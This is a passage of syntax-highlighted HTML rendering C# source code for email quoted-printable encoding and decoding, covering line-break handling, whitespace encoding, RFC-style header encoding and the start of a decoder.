</span><span class="sc0">            </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">;</span><span class="sc0">
            
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">currLine</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">bNewline</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            
            </span><span class="sc11">Encoding</span><span class="sc0"> </span><span class="sc11">oEncoding</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Encoding</span><span class="sc10">.</span><span class="sc11">GetEncoding</span><span class="sc10">(</span><span class="sc11">charset</span><span class="sc10">);</span><span class="sc0">         
        
            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">];</span><span class="sc0">
                
                </span><span class="sc2">// RULE # 4: LINE BREAKS
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">))</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// peek ahead make sure the "whole" newline is present
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">sidx</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">)==</span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">NewLine</span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc2">// RULE #3: ENCODE WHITESPACE PRECEEDING A HARD BREAK
</span><span class="sc0">                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">' '</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc2">// if char is preceded by space char add =20
</span><span class="sc0">                                </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Remove</span><span class="sc10">(</span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"=20"</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                            </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\t'</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc2">// if char is preceded by tab char add =09
</span><span class="sc0">                                </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Remove</span><span class="sc10">(</span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
                                </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"=09"</span><span class="sc10">);</span><span class="sc0">
                            </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">

                        </span><span class="sc2">// flag for new line
</span><span class="sc0">                        </span><span class="sc11">bNewline</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc2">// jump ahead 
</span><span class="sc0">                        
                    </span><span class="sc10">}</span><span class="sc0"> 
                    </span><span class="sc5">else</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">   </span><span class="sc2">// not actually a newline.  Encode per Rule #1
</span><span class="sc0">                        </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc6">"=0"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">((</span><span class="sc16">byte</span><span class="sc10">)</span><span class="sc11">ch</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc10">).</span><span class="sc11">ToUpper</span><span class="sc10">());</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc2">// RULE #1 and #2
</span><span class="sc0">                    </span><span class="sc2">// Optional characters are: !"#$@[\]^`{|}~
</span><span class="sc0">                </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">126</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'\t'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'='</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc16">byte</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">outByte</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">byte</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">];</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">iCount</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">oEncoding</span><span class="sc10">.</span><span class="sc11">GetBytes</span><span class="sc10">(</span><span class="sc6">""</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">outByte</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">

                    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">iCount</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">++)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">outByte</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]&lt;</span><span class="sc4">16</span><span class="sc10">)</span><span class="sc0">
                            </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc6">"=0"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">outByte</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">).</span><span class="sc11">ToUpper</span><span class="sc10">());</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0">
                            </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc6">"="</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">outByte</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">).</span><span class="sc11">ToUpper</span><span class="sc10">());</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                
                </span><span class="sc2">// Rule #5: MAXIMUM length 76 characters per line
</span><span class="sc0">                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">76</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// just make sure not to split an encoded char
</span><span class="sc0">                    </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">cLine</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">breakAt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">cLine</span><span class="sc10">.</span><span class="sc11">LastIndexOf</span><span class="sc10">(</span><span class="sc6">"="</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">breakAt</span><span class="sc10">&lt;</span><span class="sc4">70</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">breakAt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">74</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">cLine</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">breakAt</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"=\r\n"</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc11">currLine</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">(</span><span class="sc11">cLine</span><span class="sc10">.</span><span class="sc11">Substring</span><span class="sc10">(</span><span class="sc11">breakAt</span><span class="sc10">));</span><span class="sc0">                     
                </span><span class="sc10">}</span><span class="sc0">
                
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">bNewline</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc2">// RFC 822 linebreak = CRLF
</span><span class="sc0">                    </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0"> 
                    </span><span class="sc11">currLine</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">
                    </span><span class="sc11">bNewline</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            
            </span><span class="sc2">// add last line
</span><span class="sc0">            </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">Append</span><span class="sc10">(</span><span class="sc11">currLine</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
            
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Convert to Quoted Printable if necessary
</span><span class="sc0">        </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="s"&gt;&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="charset"&gt;&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="forceconversion"&gt;force a conversion&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">forceconversion</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">forceconversion</span><span class="sc10">)</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">needsconversion</span><span class="sc10">=</span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">126</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">)</span><span class="sc0"> 
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">needsconversion</span><span class="sc10">=</span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc11">needsconversion</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"=?"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"?Q?"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ConvertToQP</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"?="</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Convert to Quoted printable if necessary.
</span><span class="sc0">        </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="s"&gt;&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="charset"&gt;&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">ConvertHeaderToQP</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">charset</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ConvertFromQP</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
        
            </span><span class="sc2">// source char array:
</span><span class="sc0">            </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc2">// result char array:
</span><span class="sc0">            </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">result</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">[(</span><span class="sc16">int</span><span class="sc10">)(</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">*</span><span class="sc4">1.1</span><span class="sc10">)];</span><span class="sc0">
            </span><span class="sc2">// environment newline char:
</span><span class="sc0">            </span><span class="sc16">char</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">nl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Environment</span><span class="sc10">.</span><span class="sc11">NewLine</span><span class="sc10">.</span><span class="sc11">ToCharArray</span><span class="sc10">();</span><span class="sc0">      
            
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">last</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">didx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                </span><span class="sc11">slen</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc10">;</span><span class="sc0">
            
            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc10">&lt;</span><span class="sc11">slen</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">++];</span><span class="sc0">
                
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ch</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'='</span><span class="sc10">)</span><span class="sc0"> 
                </span><span class="sc10">{</span><span class="sc0">   

                    </span><span class="sc2">// Premature EOF
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">slen</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
                    </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ParseException</span><span class="sc10">(</span><span class="sc6">"Premature EOF"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                
                    </span><span class="sc2">// RULE # 5
</span><span class="sc0">                    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\r'</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
                    </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc11">sidx</span><span class="sc10">++;</span><span class="sc0">
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\r'</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc11">sidx</span><span class="sc10">++;</span><span class="sc0">
                        </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc2">// RULE # 1
</span><span class="sc0">                    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                        </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">repl</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Int32</span><span class="sc10">.</span><span class="sc11">Parse</span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">]),</span><span class="sc0"> </span><span class="sc11">NumberStyles</span><span class="sc10">.</span><span class="sc11">HexNumber</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">lo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Int32</span><span class="sc10">.</span><span class="sc11">Parse</span><span class="sc10">(</span><span class="sc11">Convert</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">[</span><span class="sc11">sidx</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">]),</span><span class="sc0"> </span><span class="sc11">NumberStyles</span><span class="sc10">.</span><span class="sc11">HexNumber</span><span class="sc10">);</span><span class="sc0">
                        
                        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">hi</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">lo</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> 
                        </span><span class="sc10">{</span><span class="sc0">
                            </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">ParseException</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">String</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sidx</span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" is an invalid code"</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
                        </span><span class="sc5">else</span><span class="sc0"> 
                        </span><span class="sc10">{</span><span class="sc0">
